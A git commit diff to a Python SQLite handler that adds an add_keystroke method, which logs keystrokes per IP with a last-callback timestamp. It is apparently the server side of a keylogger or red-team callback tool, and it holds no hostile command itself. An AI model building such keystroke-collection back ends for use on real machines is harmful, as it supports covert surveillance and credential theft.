6447f041d00e1030583bcf6bdae79516490d86a8
Micah J. Martin <mjm5097@rit.edu>
2018-02-16 19:04:45 -0500

    Added the add_keystrokes, added a bunch of DB stuff too

--- server/src/database.py
+++ server/src/database.py
@@ -3,21 +3,36 @@ Database handler object
 Author: Micah Martin (knif3)
 """
 
+from toolbox import validate_ip as vip
 from os.path import exists
 import sqlite3
 class Database(object):
     """
     Database handler object. Abstracts alot of SQLite stuff
     """
-    def __init__(self, location):
+    def __init__(self, location, script=None):
         # The location of the DB
         self.location = location
-        # If it exists, get all the tables
-        if exists(location):
-            self.conn = sqlite3.connect(location, check_same_thread=False)
-            self.cur = self.conn.cursor()
-        else:
-            raise Exception("Database not found {}.".format(location))
+        # Check if the file exists BEFORE the connect creates it
+        ex = exists(location)
+        self.conn = sqlite3.connect(location, check_same_thread=False)
+        self.cur = self.conn.cursor()
+        # If it doesnt exist, run the script on it
+        if not ex:
+            print "Creating DB"
+            self.create(script)
+    
+    def __enter__(self):
+        return self
+    
+    def __exit__(self, exc_type, exc_value, traceback):
+        self.close()
+
+    def close(self):
+        """
+        Close the connection
+        """
+        self.conn.close()
 
     def create(self, script=None):
         '''
@@ -35,27 +50,7 @@ class Database(object):
         # Build the tables
         self.cur.executescript(build_script)
         # Commit the new script
-        db_connection.commit()
-    
-    def __enter__(self):
-        return self
-    def __exit__(self, exc_type, exc_value, traceback):
-        self.close()
-
-    def close(self):
-        """
-        Close the connection
-        """
-        self.conn.close()
-
-    def handle_query(self, qry, value):
-        """
-        Handle one specific query where there is only one value
-        """
-        if type(value).__name__ in ('str', 'int'):
-            value = (value,)
-        self.cur.execute(qry, value)
-        return self.newcur(self.cur)
+        self.conn.commit()
 
     def qry(self, qry):
         """
@@ -76,6 +71,25 @@ class Database(object):
                 d[cols[j]] = i[j]
             output += [d]
         return output
+
+    def add_keystroke(self, ip, keystroke):
+        '''
+        Add a keystroke entry to the DB
+        '''
+        # Make sure we are using a valid IP address
+        ip = ip.strip()
+        if not vip(ip):
+            raise "Not a valid IP"
+        # Create a query string that will update the last check in time for an ip
+        qry1 = "REPLACE INTO timestamps('ip') VALUES(?);"
+        # Create a string that will add the keystroke to the DB
+        qry2 = "INSERT INTO keystrokes('ip','keystroke') VALUES(?,?);"
+        # Update the last callback time
+        self.cur.execute(qry1, (ip,))
+        # Add the keystroke to the database
+        self.cur.execute(qry2, (ip,keystroke))
+        # Write the changes to teh DB
+        self.conn.commit()
 
     def GENERIC(self, table, col, val):
         """
